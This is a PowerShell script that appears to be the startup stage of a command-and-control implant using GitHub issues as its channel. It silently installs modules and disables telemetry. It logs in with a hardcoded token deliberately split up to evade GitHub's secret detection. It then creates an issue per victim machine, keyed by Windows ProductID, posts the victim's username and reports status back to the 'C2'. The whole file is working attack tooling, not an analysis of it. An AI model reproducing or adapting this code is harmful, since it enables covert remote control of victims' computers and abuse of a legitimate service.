#Use this function to write to the console log. Proper usage: Write-Console -Text $textVar -IssueNumber $issueNum
function Write-Console
{
	param([String]$Text, [int]$IssueNumber)
	$consoleLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\console.log"
	$timeStamp = Get-Date -Format G
	try
	{
		Add-Content -Path $consoleLogPath -Value ($timeStamp + ": " + $Text + "`n")
	}
	catch
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $IssueNumber -Body ($timeStamp + ": Encountered an error trying to write to the console log. The error message is: " + $Error)
		Exit
	}
}

#ENTRY POINT
#Confirm that NuGet is installed. If not, install it and confirm installation.
If((Get-PackageProvider).Name -clike 'NuGet')
{
	Write-Host "DEBUG: NuGet OK."
}
Else
{
	try
	{
		Write-Host "DEBUG: NuGet not found. Attempting to install NuGet..."
		Install-PackageProvider -Name NuGet -scope CurrentUser -Force
		Write-Host "DEBUG: NuGet installation command has finished executing."

		#Verify that NuGet was installed correctly.
		If((Get-PackageProvider).Name -clike 'NuGet')
		{
			Write-Host "DEBUG: NuGet installation appears to be successful."
		}
		Else
		{
			Write-Host "DEBUG: NuGet installation appears to have failed. Exiting."; Start-Sleep -s 10
			Exit
		}
	}
	catch
	{
		Write-Host "DEBUG: NuGet installation threw an exception. Exiting."; Start-Sleep -s 10
		Exit
	}
}

#Confirm that PowerShellForGitHub is installed. If not, install it and confirm installation.
If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
{
	Write-Host "DEBUG: PowerShellForGitHub OK."
}
Else
{
	try
	{
		Write-Host "DEBUG: PowerShellForGitHub not found. Attempting to install PowerShellForGitHub..."
		Install-Module -Name PowerShellForGithub -Scope CurrentUser -Force
		Write-Host "DEBUG: PowerShellForGitHub installation command has finished executing."

		#Verify that PowerShellForGitHub was installed correctly.
		If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
		{
			Write-Host "DEBUG: PowerShellForGitHub installation appears to be successful."
		}
		Else
		{
			Write-Host "DEBUG: PowerShellForGitHub installation appears to have failed. Exiting."; Start-Sleep -s 10
			Exit
		}
	}
	catch
	{
		Write-Host "DEBUG: PowerShellForGitHub installation threw an exception. Exiting."; Start-Sleep -s 10
		Exit
	}
}

#We must import PSFG each time we start a new PowerShell session.
try 
{
	Import-Module -Name PowerShellForGitHub
	Write-Host "DEBUG: PowerShellForGitHub import OK."
}
catch
{
	Write-Host "DEBUG: PowerShellForGitHub import threw an exception. Exiting."; Start-Sleep -s 10
	Exit
}

#Disable telemetry on PSFG.
try 
{
	Set-GitHubConfiguration -DisableTelemetry -SessionOnly
	Write-Host "DEBUG: Telemetry disabled OK."
}
catch 
{
	Write-Host "DEBUG: Disabling telemetry threw an exception. Exiting."; Start-Sleep -s 10
	Exit
}

#Login to GitHub using our auth token. Make sure to split up the token so GitHub can't detect it and disable it for us.
try 
{
	$token = 'ffbc' + 'f7ac0f2e' + '9b703fcfd17e4f' + 'ab4104269e81ad'
	$secure = ConvertTo-SecureString $token -AsPlainText -Force
	$cred = New-Object System.Management.Automation.PSCredential "USERNAME_IS_IGNORED", $secure
	Set-GitHubAuthentication -Credential $cred
	$user = Get-GitHubUser -Current
	If($user.login -clike 'BeinnUais1')
	{
		Write-Host "DEBUG: Logged in succesfully."
	}
	Else
	{
		Write-Host "DEBUG: Login failed. Exiting."; Start-Sleep -s 10
		Exit
	}
}
catch 
{
	Write-Host "DEBUG: Exception or error thrown while trying to log in to GitHub. Exiting."; Start-Sleep -s 10
	Exit
}

#Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with C2.
$compInfo = Get-ComputerInfo
Write-Host "DEBUG: Finished getting computer info."

#Declare the issue number variable here so it remains in scope. Zero is not a valid issue number, so that can be used for error checking.
$issueNum = 0

#Get the issue number this machine will use to communicate. If an issue for this machine does not exist, create one and verify it was created successfully.
try
{
	$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
	$issueList | ForEach-Object -Process `
	{
		If($_.Title -clike $compInfo.WindowsProductID)
		{
			$issueNum = $_.number
			Write-Host "DEBUG: Found the issue number for this machine OK."	
		}
	}
	#Only executes if the $issueNum wasn't set above because the ProductID has no associated issue.
	If($issueNum -clike "0")
	{
		New-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1 -Title $compInfo.WindowsProductID -Body $env:USERNAME
		Write-Host "DEBUG: Just tried to create a new issue for this machine. Verifying..."
		$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
		$issueList | ForEach-Object -Process `
		{
			If($_.Title -clike $compInfo.WindowsProductID)
			{
				$issueNum = $_.number
				Write-Host "DEBUG: New issue for this machine created OK."
			}
		}
		#Confirm that $issueNum now has the correct issue number that we created above.
		If($issueNum -clike "0")
		{
			Write-Host "DEBUG: Issue creation failed. Unable to find an issue associated with this machine."; Start-Sleep -s 10
			Exit
		}
	}
}
catch
{
	Write-Host ("DEBUG: Exception thrown trying to identify or create an issue associated with this machine. Exiting."); Start-Sleep -s 10
	Exit
}

#Check if $env:UserProfile\Documents\WindowsPowerShell exists, if not, create and verify it. We are now logged in to GitHub and can post an error message.
$path = "$env:USERPROFILE\Documents\WindowsPowerShell"
if ($path | Test-Path)
{
	Write-Host "DEBUG: Logs folder located OK."
}
Else
{
	try
	{
		Write-Host "DEBUG: Trying to create the logs folder..."
		[System.IO.Directory]::CreateDirectory($path)
		Write-Host "DEBUG: No exceptions thrown creating the logs folder. Verifying..."
	}
	catch
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown trying to create the logs folder. Message: " + $Error)
		Write-Host "DEBUG: Exception thrown trying to create the logs folder. Notified C2. Exiting."; Start-Sleep -s 10
		Exit
	}
	if (-not ($path | Test-Path))
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("No exceptions thrown, but unable to locate the logs folder. Exiting.")
		Write-Host "DEBUG: Unable to locate the logs folder despite no exceptions being thrown. Notified C2. Exiting."; Start-Sleep -s 10
		Exit
	}
}

#Write to console log that the script started up OK.
Write-Console -Text "Startup OK." -IssueNumber $issueNum
Write-Host "DEBUG: Completed the entire script OK."; Start-Sleep -s 1000